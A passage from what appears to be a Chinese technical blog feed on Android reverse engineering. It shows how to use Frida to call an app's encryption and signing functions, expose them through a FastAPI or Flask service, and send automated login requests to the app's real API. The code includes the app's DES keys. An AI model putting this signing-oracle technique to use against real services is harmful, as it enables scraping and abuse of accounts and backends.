class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">let</span> r1 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">paraMap</span>(map, <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>, <span class="string">&quot;sign&quot;</span>)</span><br><span class="line">        <span class="comment">// console.log(&quot;r1:&quot;, r1)</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">encodeDesMap</span>(r1, <span class="string">&quot;65102933&quot;</span>, <span class="string">&quot;32028092&quot;</span>)</span><br><span class="line">        <span class="comment">// console.log(&quot;r2:&quot;, r2)</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//响应解密</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">calldecodedesjson</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>).<span class="title function_">decodeDesJson</span>(data, <span class="string">&quot;65102933&quot;</span>, <span class="string">&quot;32028092&quot;</span>)</span><br><span class="line">        <span class="comment">// console.log(&quot;decode:&quot;, decode)</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="搭建服务"><a href="#搭建服务" class="headerlink" title="搭建服务"></a>搭建服务</h2><p>既然上述已经把逻辑捋清楚了，并且也已经写好的主动调用的js代码。</p><p>那么就来了，如何和python结合到一起，跑成一个web，这样爬虫只需要响应的参数拿到返回值即可。</p><p><strong>代码</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">jsCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    function callparamap(username, userPwd, timeStamp) &#123;</span></span><br><span class="line"><span class="string">        let result = &quot;&quot;;</span></span><br><span class="line"><span class="string">        Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">            let map = Java.use(&quot;java.util.HashMap&quot;).$new();</span></span><br><span class="line"><span class="string">            map.put(&quot;timeStamp&quot;, timeStamp)</span></span><br><span class="line"><span class="string">            map.put(&quot;loginImei&quot;, &quot;Androidnull&quot;)</span></span><br><span class="line"><span class="string">            map.put(&quot;equtype&quot;, &quot;ANDROID&quot;)</span></span><br><span class="line"><span class="string">            map.put(&quot;userPwd&quot;, userPwd)</span></span><br><span class="line"><span class="string">            map.put(&quot;username&quot;, username)</span></span><br><span class="line"><span class="string">            //</span></span><br><span class="line"><span class="string">            let r1 = Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).paraMap(map, &quot;sdlkjsdljf0j2fsjk&quot;, &quot;sign&quot;)</span></span><br><span class="line"><span class="string">            // console.log(&quot;r1:&quot;, r1)</span></span><br><span class="line"><span class="string">            //</span></span><br><span class="line"><span class="string">            result = Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).encodeDesMap(r1, &quot;65102933&quot;, &quot;32028092&quot;)</span></span><br><span class="line"><span class="string">            // console.log(&quot;r2:&quot;, r2)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    function calldecodedesjson(data) &#123;</span></span><br><span class="line"><span class="string">        let result = &quot;&quot;;</span></span><br><span class="line"><span class="string">        Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">            result = Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;).decodeDesJson(data, &quot;65102933&quot;, &quot;32028092&quot;)</span></span><br><span class="line"><span class="string">            // console.log(&quot;decode:&quot;, decode)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        return result;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    rpc.exports = &#123;</span></span><br><span class="line"><span class="string">        encrypt: callparamap,</span></span><br><span class="line"><span class="string">        decode: calldecodedesjson,</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 准备工作</span></span><br><span class="line"><span class="comment"># process = frida.get_device_manager().add_remote_device(&#x27;192.168.3.68:27042&#x27;).attach(&quot;com.dodonew.online&quot;)</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;com.dodonew.online&#x27;</span>)</span><br><span class="line">script = process.create_script(jsCode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Running 小肩膀&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080/getencrypt?username=18903916120&amp;password=1111&amp;timestamp=1647662720061</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/getencrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getencrypt</span>(<span class="params">username, password, timestamp</span>):</span><br><span class="line">    result = script.exports.encrypt(username, password, timestamp)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;data&quot;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Item</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    data: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/getdecode&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getdecode</span>(<span class="params">item: Item</span>):</span><br><span class="line">    result = script.exports.decode(item.data)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;data&quot;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>运行</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101435738.png" alt="img"> </p><h2 id="构造请求调用"><a href="#构造请求调用" class="headerlink" title="构造请求调用"></a>构造请求调用</h2><p><strong>代码</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dt = time.time() * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求加密</span></span><br><span class="line">url = <span class="string">f&quot;http://127.0.0.1:8080/getencrypt?username=18903916120&amp;password=1111&amp;timestamp=<span class="subst">&#123;dt&#125;</span>&quot;</span></span><br><span class="line">r1 = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r1.json())</span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">url = <span class="string">&quot;http://api.dodovip.com/api/user/login&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;Encrypt&quot;</span>: r1.json().get(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">r = requests.post(url=url, headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># 拿到请求解密</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: r.text</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/getdecode&quot;</span></span><br><span class="line">r = requests.post(url=url,headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>运行</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101436619.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动调用-Java层主动调用并暴漏至公网</title>
      <link href="/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Java%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/"/>
      <url>/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Java%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-pyenv更新"><a href="#0x00-pyenv更新" class="headerlink" title="0x00 pyenv更新"></a>0x00 pyenv更新</h1><p>当有Python新版本更新后，如果旧版本pyenv没有集成进去的话，需要手动更新一下pyenv版本，方便安装。</p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>win比较简单，直接 <code>pyenv update</code> 就行</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091556011.png" alt="image.png"> </p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>参考：<a href="https://github.com/pyenv/pyenv-update">GitHub - pyenv&#x2F;pyenv-update: update pyenv and plugins</a></p><p>1、安装pyenv的更新扩展</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv-update.git $(pyenv root)/plugins/pyenv-update</span><br></pre></td></tr></table></figure><p>2、更新</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyenv update</span><br></pre></td></tr></table></figure><h1 id="0x01-Demo介绍"><a href="#0x01-Demo介绍" class="headerlink" title="0x01 Demo介绍"></a>0x01 Demo介绍</h1><h2 id="代码介绍"><a href="#代码介绍" class="headerlink" title="代码介绍"></a>代码介绍</h2><p>1、定义两个方法 method01和method02，分别用来进行AES加密和解密。</p><p>其中method01为静态方法；method02为实例方法。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558967.png" alt="image.png"> </p><p>2、进到so层中查看具体函数实现，会发现这两个函数是做了动态绑定的（java层和so层的函数名不要求一样，会在代码中进行动态绑定的）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558375.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558435.png" alt="image.png"> </p><p>3、在java代码中，会调用method01和method02对StringFromJNI2返回的内容进行加密和解密</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091558685.png" alt="image.png"> </p><p>StringFromJNI2函数返回的内容为“Hello from c++ StringFromJNI2”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091559233.png" alt="image.png"> </p><p>到这，整个demo的逻辑就清楚了~~~</p><h2 id="参数构造和主动调用核心原则"><a href="#参数构造和主动调用核心原则" class="headerlink" title="参数构造和主动调用核心原则"></a>参数构造和主动调用核心原则</h2><h3 id="第一步：Hook"><a href="#第一步：Hook" class="headerlink" title="第一步：Hook"></a>第一步：Hook</h3><p>主动调用之前先hook，hook本身就是一个主动调用的过程。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br><span class="line">android  hooking list class_methods com.example.demoso1.MainActivity</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091606570.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hook类中所有方法</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity</span><br><span class="line"></span><br><span class="line"># hook关键函数method01和method02</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity.method01 --dump-args --dump-backtrace  --dump=return</span><br><span class="line">android hooking watch class com.example.demoso1.MainActivity.method02 --dump-args --dump-backtrace  --dump=return</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607018.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607546.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091607535.png" alt="image.png"> </p><h3 id="第二步，主动调用"><a href="#第二步，主动调用" class="headerlink" title="第二步，主动调用"></a>第二步，主动调用</h3><p>1、首先，method01是静态方法，可以直接调用</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609000.png" alt="image.png"> </p><p>运行之后发现，打印出来的result 为 undefined？？？？这是啥原因</p><p>这是因为，我们将 var result 定义到了Java.preform的虚拟机中了，这样在主动调用的时候，是传不到外面来的。</p><p>所以，修改代码如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609149.png" alt="img"> </p><p>成功打印：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091609214.png" alt="img"> </p><p>2、method02是非静态方法，所以，需要先找到它的实例对象，再调用method02方法</p><p>使用Java.choose进行查找。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610377.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610977.png" alt="image.png"> </p><p>这块就可以保证在JS代码中主动调用正常运行了</p><h3 id="第三步：rpc"><a href="#第三步：rpc" class="headerlink" title="第三步：rpc"></a>第三步：rpc</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rpc.<span class="property">exports</span>=&#123;</span><br><span class="line">    <span class="attr">fridamethod01</span>:fridamethod01,</span><br><span class="line">    <span class="attr">fridamethod02</span>:fridamethod02</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091610058.png" alt="img"> </p><h2 id="基于IP构建Frida-server集群"><a href="#基于IP构建Frida-server集群" class="headerlink" title="基于IP构建Frida-server集群"></a>基于IP构建Frida-server集群</h2><p>使用Python来调用上面的Frida脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义错误处理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    // message 参数包含消息的类型和内容</span><br><span class="line">    // data </span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动目标应用并附加到 Frida</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.1:8888&quot;</span>)</span><br><span class="line">pid = device.spawn(<span class="string">&#x27;com.example.demoso1&#x27;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载JS脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;my_script.js&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载脚本并定义消息处理函数</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以通过 RPC 调用定义的函数</span></span><br><span class="line">result = script.exports.myFunction(arg1, arg2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本会持续运行等待输入</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><h1 id="0x02-配置flask实现Http接口调用"><a href="#0x02-配置flask实现Http接口调用" class="headerlink" title="0x02 配置flask实现Http接口调用"></a>0x02 配置flask实现Http接口调用</h1><p>[<a href="https://bbs.kanxue.com/thread-262562.htm">原创]frida-rpc 远程调用SO里面的加解密算法-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p>apk拖到jadx里面，找到我们需要调用的方法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091709533.png" alt="img"> </p><p>我们就不去分析他的so了  我们要使用的是frida-rpc远程调用接口。。。 </p><p>看一下，这两个方法的具体代码：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091714655.png" alt="image.png"> </p><p>传string参数  返回byte[]</p><p>直接调用encryptSrc 传string返回string，decryptSrc 同理</p><p>上frida rpc代码</p><p><strong>test.js</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724895963320-749ef596-d178-46c5-9fbb-b267a689e03d.png" alt="img"> </p><p>python 代码  我们要远程调用API接口，<br>直接在GitHub下载的 别人代码改了一下，全POST接口方法传参数</p><p><strong>flask框架</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724896159461-26691085-39b1-49c4-932b-b7d15883059b.png" alt="img"> </p><p>启动我们手机里面的frida-server 服务，我改名为fs  用后台启动</p><p>看图</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716909.png" alt="img"> </p><p>运行我们的flask框架</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716891.png" alt="img"> </p><p>调用一下加解密，接迷的API接口看看</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091716925.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1724896230009-b57ff62f-f5b6-448b-83b1-3bbdcef20ae2.png" alt="img"> </p><h1 id="0x03-配置NPS实习外网调用fs或http接口"><a href="#0x03-配置NPS实习外网调用fs或http接口" class="headerlink" title="0x03 配置NPS实习外网调用fs或http接口"></a>0x03 配置NPS实习外网调用fs或http接口</h1><p><a href="https://blog.csdn.net/qq_41813208/article/details/113760249">https://blog.csdn.net/qq_41813208/article/details/113760249</a></p><h1 id="0x04-压力测试Http接口并发性能"><a href="#0x04-压力测试Http接口并发性能" class="headerlink" title="0x04 压力测试Http接口并发性能"></a>0x04 压力测试Http接口并发性能</h1><p>siege压力测试工具，可参考如下：</p><p><a href="https://www.cnblogs.com/chenxiaomeng/p/13130526.html">【压测】压力测试工具siege的用法 - 陈晓猛 - 博客园 (cnblogs.com)</a></p><p><a href="https://cloud.tencent.com/developer/article/1921001">web网站压测工具Siege介绍-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> rpc </tag>
            
            <tag> flask </tag>
            
            <tag> NPS </tag>
            
            <tag> Siege压测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置RPC和开发姿势</title>
      <link href="/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-%E9%85%8D%E7%BD%AERPC%E5%92%8C%E5%BC%80%E5%8F%91%E5%A7%BF%E5%8A%BF/"/>
      <url>/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-%E9%85%8D%E7%BD%AERPC%E5%92%8C%E5%BC%80%E5%8F%91%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>Frida是一款基于Python和JavaScript的进程级Hook框架，其中JavaScript语言承担了Hook的主要工作，而Python语言则相当于提供给外界的绑定接口，使用者可以通过Python语言将JavaScript脚本注入进程中，官方也在下方仓库中提供了Python远程调用JavaScript中函数的方式：</p><p><a href="https://github.com/frida/frida-python"><strong>https://github.com/frida/frida-python</strong></a></p><p>下面简单介绍下通过Python实现Frida注入的基本方式。</p><h1 id="0x00-开发环境准备"><a href="#0x00-开发环境准备" class="headerlink" title="0x00 开发环境准备"></a>0x00 开发环境准备</h1><p>工欲善其事，必先利其器。编写 frida js 时让 IDE 智能提示【使用 IDE 编写 frida js 时智能提示】</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul><li><strong>git clone <a href="https://github.com/oleavr/frida-agent-example.git">https://github.com/oleavr/frida-agent-example.git</a></strong></li><li>**cd frida-agent-example&#x2F;**，执行命令 <strong>npm install</strong></li><li>然后使用 VSCode、pycharm、idea 等 IDE 打开此工程，在 agent 目录下编写 JavaScript 代码时就会有智能提示。</li></ul><h3 id="JS单步调试"><a href="#JS单步调试" class="headerlink" title="JS单步调试"></a>JS单步调试</h3><p><a href="https://bbs.pediy.com/thread-265160.htm">https://bbs.pediy.com/thread-265160.htm</a></p><p>能愉快的单步调试 frida 的 js 脚本，可以方便不少。首先运行 frida 脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frida -l &lt;/Users/name/path/test.js&gt; --debug --runtime=v8 &lt;port/name&gt;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session = dev.attach(app.pid)</span><br><span class="line">script = session.create_script(jscode, runtime=<span class="string">&quot;v8&quot;</span>)</span><br><span class="line">session.enable_debugger()</span><br></pre></td></tr></table></figure><p>启动后会回显 Inspector 正在监听 9229 默认端口</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Chrome Inspector server listening on port <span class="number">9229</span></span><br></pre></td></tr></table></figure><h4 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h4><p>打开 chrome:&#x2F;&#x2F;inspect, 点击 <code>Open dedicated DevTools for Node。</code></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081422305.png" alt="image.png"> </p><p>此时 debug 已经连接，切换至 <code>Sources</code>，按 <code>Command + P</code> 加载要调试的脚本，即可下断调试了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081422998.png" alt="image.png"> </p><h4 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h4><p>首先安装 Node.js 插件，重启。添加调试器 <code>Attaching to Node.js/Chrome</code>，端口默认即可。<code>Attach to</code> 应选择 <code>Node.js &lt; 8 started with --debug</code>， 下面的自动重连选项可选可不选。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424191.png" alt="image.png"> </p><p>触发断点需要在 debug 窗口切换到 script 选项卡，右键要调试的脚本，选择 Open Actual Source，在新打开的 Actual Source 窗口设置好断点后，需要再取消&#x2F;启用一次所有断点作为激活，发现断点上打上对勾才真正可用了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424695.png" alt="image.png"> </p><p>接下来就可以正常调试了</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081424106.png" alt="image.png"> </p><h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><ol><li>用 Chrome 调试支持的更为顺滑，调试脚本自动重加载，断点也能正确响应。</li><li>用 PyCharm 调试断点有时需要手动激活有点麻烦，但可以使用PyCharm 的Debug 窗口和快捷键。</li><li>PyCharm 使用 ts 环境调试时，可以直接在ts文件上下断，也不需要手动激活断点。</li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p><a href="https://blog.csdn.net/airuozhaoyang/article/details/110789942">https://bbs.pediy.com/thread-258513.htm</a></p><h3 id="基础Frida代码完成"><a href="#基础Frida代码完成" class="headerlink" title="基础Frida代码完成"></a>基础Frida代码完成</h3><p>frida 代码提示插件。如果你安装了 Frida, 不管你熟不熟悉 nodejs 的生态, 肯定已经安装好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">npm install @types/frida-gum</span><br></pre></td></tr></table></figure><p>你需要在你编写注入 js 文件的目录下运行 ( 可以不事先创建 package.json，只是会出现一条警告 )</p><p>然后使用可以TypeScript代码完成功能的编辑器 ( 比如 vscode、pycharm、idea ) 打开js文件即刻。</p><p>“<strong>基础 frida 代码完成</strong>“ 就可以补全 frida js 代码，如果想要 类成员函数及成员变量的类型等功能，可以安装插件 <strong>frida-tsplugin</strong> </p><h3 id="下载并安装插件-frida-tsplugin"><a href="#下载并安装插件-frida-tsplugin" class="headerlink" title="下载并安装插件 frida-tsplugin"></a>下载并安装插件 <strong>frida-tsplugin</strong></h3><p>在任意目录下：<strong>git clone <a href="https://github.com/tacesrever/frida-tsplugin">https://github.com/tacesrever/frida-tsplugin</a></strong> ，然后在 frida-tsplugin 目录下运行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm run <span class="built_in">compile</span></span><br></pre></td></tr></table></figure><h3 id="Frida-tsplugin-特性"><a href="#Frida-tsplugin-特性" class="headerlink" title="Frida-tsplugin 特性"></a><strong>Frida-tsplugin</strong> 特性</h3><ol><li>可以识别 Java.use 和 Java.cast</li><li>可以追踪变量赋值传递</li><li>可以识别并追踪类成员函数及成员变量的类型</li><li>可以根据重载函数的参数类型识别对应的重载函数</li><li>可以识别 <code>someJavaFunction[.overload(...)].implementation = function(...) &#123;...&#125;</code> 函数块中的参数类型和this类型</li></ol><p>ps. 对于未能追踪到的类型, 可以使用 Java.cast 来为其做一个声明</p><h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><h2 id="获取设备"><a href="#获取设备" class="headerlink" title="获取设备"></a>获取设备</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 无线连接</span></span><br><span class="line"><span class="comment"># /data/local/tmp/frida-server -l 0.0.0.0:6666</span></span><br><span class="line"><span class="comment"># Wifi ADB监听IP和端口为192.168.2.111:5555</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.2.111:6666&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有线连接</span></span><br><span class="line">device = frida.get_usb_device()</span><br></pre></td></tr></table></figure><h2 id="注入进程"><a href="#注入进程" class="headerlink" title="注入进程"></a>注入进程</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># spawn方式注入进程</span></span><br><span class="line">pid = device.spawn([<span class="string">&#x27;com.example.luodemo&#x27;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="comment"># attach模式注入进程</span></span><br><span class="line">session = device.attach(<span class="string">&#x27;com.example.luodemo&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="注入脚本"><a href="#注入脚本" class="headerlink" title="注入脚本"></a>注入脚本</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">script = session.create_script(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">setImmediate(Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    console.log(&#x27;hello python frida&#x27;)</span></span><br><span class="line"><span class="string">&#125;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) <span class="comment">#读入Hook脚本内容</span></span><br><span class="line"></span><br><span class="line">script.load() <span class="comment">#将脚本加载进进程空间中</span></span><br></pre></td></tr></table></figure><h2 id="文件方式注入进程"><a href="#文件方式注入进程" class="headerlink" title="文件方式注入进程"></a>文件方式注入进程</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;LuoHook.js&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&#x27;目标应用包名&#x27;</span>)</span><br><span class="line">script = session.create_script(<span class="built_in">open</span>(<span class="string">&#x27;myscript.js&#x27;</span>).read())</span><br><span class="line"></span><br><span 